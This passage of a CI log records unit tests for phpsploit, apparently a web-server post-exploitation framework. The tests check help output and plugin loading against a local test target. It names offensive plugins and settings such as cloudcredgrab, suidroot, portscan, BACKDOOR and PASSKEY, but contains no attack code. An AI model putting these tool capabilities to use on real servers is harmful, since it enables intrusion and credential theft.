\u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp/tmp.WFqympJo1a\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mPHPSPLOIT\u001b[0m = \u001b[1;33mcoverage run --rcfile=/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/.coveragerc /tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/phpsploit\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mPHPSPLOIT_CONFIG_DIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp/phpsploit-config\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mRAW_PHPSPLOIT\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/phpsploit\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mWWWROOT\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp/wwwroot\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTARGET\u001b[0m = \u001b[1;33m127.0.0.1:42211\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mCOVERAGE\u001b[0m = \u001b[1;33mtrue\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mCOVERAGE_FILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/.coverage\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mCOVERAGE_RCFILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/.coveragerc\u001b[0m\n[Unit Tests/build]   | \u001b[33;2m#!/usr/bin/env bash\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### Check help warning for existing command that has been aliased\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### issue #60:  `alias` can override existing command\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### XXX: PUTTING THIS ON TOP OF TEST FILE BECAUSE SHOULD WORK EVEN IF NOT CONNECTED\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# initialize phpsploit_pipe\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe true > /dev/null || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### test for core command\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe help source > $TMPFILE-ref || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_not_contains $TMPFILE \"'source' has been aliased\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# now make an `alias` named source:\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe alias source FOO > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe help source > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE \"'source' has been aliased\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2mdiff $TMPFILE-ref <(grep -v 'has been aliased' $TMPFILE) || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# remove alias and check that warning is not more present:\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe alias source None > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe help source > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mdiff $TMPFILE $TMPFILE-ref || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### test for plugin (should work even if not connected with `exploit`)\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe help ls > $TMPFILE-ref || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_not_contains $TMPFILE \"'ls' has been aliased\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# now make an `alias` named ls:\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe alias ls FOO > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe help ls > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE \"'ls' has been aliased\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2mdiff $TMPFILE-ref <(grep -v 'has been aliased' $TMPFILE) || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# remove alias and check that warning is not more present:\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe alias ls None > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe help ls > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mdiff $TMPFILE $TMPFILE-ref || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mrm $TMPFILE*\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### help\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2m$PHPSPLOIT -e 'exploit; help' > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mgrep -q \"^Core Commands\" $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mgrep -q \"^Command Aliases\" $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mgrep -q \"^System Plugins\" $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# if not connected (`exploit`), plugins are not listed\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe help > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mgrep -q \"^Core Commands\" $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mgrep -q \"^Command Aliases\" $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mgrep -q \"^System Plugins\" $TMPFILE && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mrm $TMPFILE*\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### help <CORE-COMMAND>\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2mcore_cmds=`grep -oP '(?<=def do_)[a-z]+(?=\\()' $ROOTDIR/src/ui/interface.py`\u001b[m\n[Unit Tests/build]   | \u001b[33;2mfor cmd in $core_cmds; do\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    phpsploit_pipe help $cmd > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    grep -q \"^\\[\\*\\] $cmd: \" $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    grep -q \"^SYNOPSIS:\" $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    # min docstring lines (debug line removed)\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    [ `grep -vc '^\\[\\#' $TMPFILE` -lt 10 ] && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    echo \"[OK] help $cmd\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2mdone\u001b[m\n[Unit Tests/build]   | [OK] help exit\n[Unit Tests/build]   | [OK] help corectl\n[Unit Tests/build]   | [OK] help history\n[Unit Tests/build]   | [OK] help exploit\n[Unit Tests/build]   | [OK] help rtfm\n[Unit Tests/build]   | [OK] help session\n[Unit Tests/build]   | [OK] help lrun\n[Unit Tests/build]   | [OK] help source\n[Unit Tests/build]   | [OK] help set\n[Unit Tests/build]   | [OK] help env\n[Unit Tests/build]   | [OK] help alias\n[Unit Tests/build]   | [OK] help bind\n[Unit Tests/build]   | [OK] help backlog\n[Unit Tests/build]   | [OK] help help\n[Unit Tests/build]   | \u001b[33;2mrm $TMPFILE*\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### help <PLUGIN>\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2mplugin_paths=`find $ROOTDIR/plugins/*/* -maxdepth 0`\u001b[m\n[Unit Tests/build]   | \u001b[33;2mfor path in $plugin_paths; do\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    plugin=$(basename \"$path\")\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    phpsploit_pipe help $plugin > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    assert_contains $TMPFILE << EOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m^\\[\\*\\] $plugin: \u001b[m\n[Unit Tests/build]   | \u001b[33;2m^SYNOPSIS:$\u001b[m\n[Unit Tests/build]   | \u001b[33;2m^DESCRIPTION:$\u001b[m\n[Unit Tests/build]   | \u001b[33;2m^PLUGIN LOCATION:$\u001b[m\n[Unit Tests/build]   | \u001b[33;2mEOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    plug_loc=$(grep -A1 'PLUGIN LOCATION' $TMPFILE | tail -n1 | xargs)\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    [[ \"$path\" == \"$plug_loc\" ]] || FAIL $path / $plug_loc\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    echo \"[OK] help $plugin\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2mdone\u001b[m\n[Unit Tests/build]   | [OK] help ldap\n[Unit Tests/build]   | [OK] help cloudcredgrab\n[Unit Tests/build]   | [OK] help cat\n[Unit Tests/build]   | [OK] help cd\n[Unit Tests/build]   | [OK] help chmod\n[Unit Tests/build]   | [OK] help cp\n[Unit Tests/build]   | [OK] help download\n[Unit Tests/build]   | [OK] help edit\n[Unit Tests/build]   | [OK] help ls\n[Unit Tests/build]   | [OK] help mkdir\n[Unit Tests/build]   | [OK] help pwd\n[Unit Tests/build]   | [OK] help rm\n[Unit Tests/build]   | [OK] help rmdir\n[Unit Tests/build]   | [OK] help stat\n[Unit Tests/build]   | [OK] help touch\n[Unit Tests/build]   | [OK] help upload\n[Unit Tests/build]   | [OK] help bannergrab\n[Unit Tests/build]   | [OK] help portscan\n[Unit Tests/build]   | [OK] help mssql\n[Unit Tests/build]   | [OK] help mysql\n[Unit Tests/build]   | [OK] help oracle\n[Unit Tests/build]   | [OK] help phpinfo\n[Unit Tests/build]   | [OK] help proclist\n[Unit Tests/build]   | [OK] help run\n[Unit Tests/build]   | [OK] help suidroot\n[Unit Tests/build]   | [OK] help whoami\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### help <ALIAS>\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2m$PHPSPLOIT -e 'alias' > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mcmds=`sed -e '1,/---/d' -e '/^$/,$d' $TMPFILE | awk '{print $1}'`\u001b[m\n[Unit Tests/build]   | \u001b[33;2mfor cmd in $cmds; do\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    # check that `help <ALIAS>` == `alias <ALIAS`\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    phpsploit_pipe help $cmd > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    grep -v '^\\[\\#' $TMPFILE > $TMPFILE-1\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    phpsploit_pipe alias $cmd > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    grep -v '^\\[\\#' $TMPFILE > $TMPFILE-2\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    diff $TMPFILE-1 $TMPFILE-2 || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    echo \"[OK] help $cmd\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2mdone\u001b[m\n[Unit Tests/build]   | [OK] help @lrun\n[Unit Tests/build]   | [OK] help clear\n[Unit Tests/build]   | [OK] help lcd\n[Unit Tests/build]   | [OK] help load\n[Unit Tests/build]   | [OK] help lpwd\n[Unit Tests/build]   | [OK] help save\n[Unit Tests/build]   | [OK] help true\n[Unit Tests/build]   | \u001b[33;2mrm $TMPFILE*\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### help set <SETTING>\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2msettings=`phpsploit_pipe set | grep -E '^    [A-Z]{2,}' | awk '{print $1}'`\u001b[m\n[Unit Tests/build]   | \u001b[33;2mfor var in $settings; do\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    phpsploit_pipe help set $var > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    # issue #67:  `help set <VAR>`: display buffer type description\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    # Ref: https://github.com/nil0x42/phpsploit/issues/67\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    # check that all settings help have a buffer description\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    grep -Eq \"$var is a (Multi|Rand)LineBuffer.\" $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    # make sure a setting description is available\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    desc_lines=`sed -e '1,/^[A-Z]\\+/d' -e '/^[A-Z]\\+/,$d' $TMPFILE | wc -l`\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    [ $desc_lines -lt 2 ] && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    echo \"[OK] help set $var\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2mdone\u001b[m\n[Unit Tests/build]   | [OK] help set BACKDOOR\n[Unit Tests/build]   | [OK] help set BROWSER\n[Unit Tests/build]   | [OK] help set CACHE_SIZE\n[Unit Tests/build]   | [OK] help set EDITOR\n[Unit Tests/build]   | [OK] help set HTTP_USER_AGENT\n[Unit Tests/build]   | [OK] help set PASSKEY\n[Unit Tests/build]   | [OK] help set PAYLOAD_PREFIX\n[Unit Tests/build]   | [OK] help set PROXY\n[Unit Tests/build]   | [OK] help set REQ_DEFAULT_METHOD\n[Unit Tests/build]   | [OK] help set REQ_HEADER_PAYLOAD\n[Unit Tests/build]   | [OK] help set REQ_INTERVAL\n[Unit Tests/build]   | [OK] help set REQ_MAX_HEADERS\n[Unit Tests/build]   | [OK] help set REQ_MAX_HEADER_SIZE\n[Unit Tests/build]   | [OK] help set REQ_MAX_POST_SIZE\n[Unit Tests/build]   | [OK] help set REQ_POST_DATA\n[Unit Tests/build]   | [OK] help set REQ_ZLIB_TRY_LIMIT\n[Unit Tests/build]   | [OK] help set SAVEPATH\n[Unit Tests/build]   | [OK] help set TARGET\n[Unit Tests/build]   | [OK] help set TMPPATH\n[Unit Tests/build]   | [OK] help set VERBOSITY\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### help <COMMAND> <ARG>\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# issue #70: get help for `CMD` when calling `help CMD ARG`\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# Ref: https://github.com/nil0x42/phpsploit/issues/70\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# ensure this gives help for `corectl`:\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe help corectl FOOBAR > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mgrep -q '^\\[\\*\\] corectl: ' $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### Check invalid commands\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# check output\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe help FOO BAR > $TMPFILE && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mgrep -q '^\\[\\-\\] No help for: FOO' $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2mexit_script\u001b[m\n[Unit Tests/build]   | \u001b[0m\u001b[1;32m[+]\u001b[0;32m /tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/commands/help.sh succeeded\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m TEST_TIME=23s\u001b[0m\n[Unit Tests/build]   | \n[Unit Tests/build]   | \n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m ======================================================================\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m RUNNING /tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/core/core.plugins/RUN.sh ...\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m ======================================================================\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mPWD\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/core/core.plugins\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mROOTDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTESTDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mSCRIPTDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/core/core.plugins\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mSCRIPTFILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/core/core.plugins/RUN.sh\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTMPDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTMPFILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp/tmp.J1isxAdQ74\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mPHPSPLOIT\u001b[0m = \u001b[1;33mcoverage run --rcfile=/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/.coveragerc /tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/phpsploit\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mPHPSPLOIT_CONFIG_DIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp/phpsploit-config\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mRAW_PHPSPLOIT\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/phpsploit\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mWWWROOT\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp/wwwroot\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTARGET\u001b[0m = \u001b[1;33m127.0.0.1:42211\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mCOVERAGE\u001b[0m = \u001b[1;33mtrue\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mCOVERAGE_FILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/.coverage\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mCOVERAGE_RCFILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/.coveragerc\u001b[0m\n[Unit Tests/build]   | \u001b[33;2m#!/bin/bash\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2mn_plugs=`find $ROOTDIR/plugins/*/* -maxdepth 0 | wc -l`\u001b[m\n[Unit Tests/build]   | \u001b[33;2mn_plugs_plus2=$(( $n_plugs + 2 ))\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# string 'plugins correctly loaded' is only expected if stdin.isatty():\u001b[m\n[Unit Tests/build]   | \u001b[33;2mecho exit | $PHPSPLOIT > $TMPFILE\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_not_contains $TMPFILE \" $n_plugs plugins correctly loaded$\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_not_contains $TMPFILE \"error.* encountered while loading plugins\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### Test `core.plugins` package (plugin loader / launcher)\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### using faketty to get plugin load output\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# before bugged plugins, check that all plugins are correctly loaded\u001b[m\n[Unit Tests/build]   | \u001b[33;2mfaketty $PHPSPLOIT -e exit > $TMPFILE\u001b[m\n[Unit Tests/build]   | \u001b[33;2mdecolorize $TMPFILE\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE \" $n_plugs plugins correctly loaded$\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_not_contains $TMPFILE \"error.* encountered while loading plugins\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# reload-plugins should be ok, because there is no error\u001b[m\n[Unit Tests/build]   | \u001b[33;2m$PHPSPLOIT -e 'corectl reload-plugins' > /dev/null || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### Custom Setup (voluntary bugged USERDIR plugins)\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### using faketty to get plugin load output\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2mcp -r \"$PHPSPLOIT_CONFIG_DIR\" \"$TMPFILE-conf\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2mexport PHPSPLOIT_CONFIG_DIR=\"$TMPFILE-conf\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2mrm -rf $TMPFILE-conf/plugins\u001b[m\n[Unit Tests/build]   | \u001b[33;2mcp -r $SCRIPTDIR/test-plugins $TMPFILE-conf/plugins\u001b[m\n[Unit Tests/build]   | \u001b[33;2mchmod 333 $TMPFILE-conf/plugins/valid_category-name/plugin-py_not-readable/plugin.py\u001b[m\n[Unit Tests/build]   | \u001b[33;2msed -i \"/VERBOSITY/d\" $TMPFILE-conf/config\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2mfaketty $PHPSPLOIT -e exit > $TMPFILE\u001b[m\n[Unit Tests/build]   | \u001b[33;2mdecolorize $TMPFILE\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE << EOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m $n_plugs_plus2 plugins correctly loaded$\u001b[m\n[Unit Tests/build]   | \u001b[33;2m^\\[\\#\\] 5 errors encountered while loading plugins .*corectl reload-plugins\u001b[m\n[Unit Tests/build]   | \u001b[33;2mEOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m[ \"$(wc -l < $TMPFILE)\" -eq 2 ] || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### Check output of `help` after loading bugged plugins\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2m$PHPSPLOIT -e 'exploit; help' > $TMPFILE\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_not_contains $TMPFILE << EOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2minvalid.category\u001b[m\n[Unit Tests/build]   | \u001b[33;2m  notloaded\u001b[m\n[Unit Tests/build]   | \u001b[33;2m  cannot-compile\u001b[m\n[Unit Tests/build]   | \u001b[33;2m  invalid-name.notloaded\u001b[m\n[Unit Tests/build]   | \u001b[33;2m  is-empty\u001b[m\n[Unit Tests/build]   | \u001b[33;2m  plugin-py_not-readable\u001b[m\n[Unit Tests/build]   | \u001b[33;2mEOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE << EOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m^Valid category-name Plugins$\u001b[m\n[Unit Tests/build]   | \u001b[33;2m  is-valid  \u001b[m\n[Unit Tests/build]   | \u001b[33;2m  is-in-existing_category  \u001b[m\n[Unit Tests/build]   | \u001b[33;2mEOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# check this plugin is listed within default 'System Plugins' category\u001b[m\n[Unit Tests/build]   | \u001b[33;2m[ \"$(grep -c \"^System Plugins\" $TMPFILE)\" -eq 1 ] || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mgrep -A1 \"is-in-existing_category\" $TMPFILE | grep -q '  phpinfo  ' || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### Check output of `help` after loading bugged plugins\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | 